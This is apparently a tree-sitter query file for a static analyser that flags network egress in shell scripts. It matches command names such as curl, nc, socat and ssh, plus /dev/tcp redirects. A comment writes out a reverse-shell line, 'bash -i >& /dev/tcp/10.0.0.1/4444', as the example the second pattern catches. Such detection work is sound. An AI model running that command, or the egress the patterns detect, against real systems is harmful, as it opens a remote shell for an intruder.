; Sends data to, or fetches data from, a network endpoint, in shell.
;
; Shell is the one language where this term is unambiguous. The decision rule the
; labelling pass used says invoking a networked CLI — `gh`, `aws`, `npm install`
; — counts as process execution rather than egress, because a static analyser can
; never see inside those binaries and claiming otherwise would manufacture a
; false negative no rule could fix. `curl` and `ssh` are different: the script
; names the protocol itself, in its own text.

; curl -sS https://... / wget -q ... / ssh host cmd / scp file host:path
;
; Matched on the command NAME, which is what keeps the obvious false positives
; out for free. `command -v curl` has the name `command`, `which curl` has the
; name `which`, and `echo "curl ..."` has the name `echo` — in all three the word
; `curl` is an argument, and none of them opens a socket. The negative fixture
; pins all three, plus the comment case.
(command
  name: (command_name (word) @_cmd)
  (#match? @_cmd "^(curl|wget|nc|ncat|netcat|ssh|scp|sftp|rsync|telnet|socat)$")) @site

; bash -i >& /dev/tcp/10.0.0.1/4444
;
; A bash-specific pseudo-device: redirecting to it opens a TCP connection. The
; command name here is `bash`, so the pattern above cannot see it, and the whole
; construct exists almost exclusively to make a reverse shell. One bundle in the
; labelled corpus uses it — a fictional-domain demonstration payload — and the
; construct is worth reporting wherever it appears.
(file_redirect
  destination: (word) @_dest
  (#match? @_dest "^/dev/(tcp|udp)/")) @site
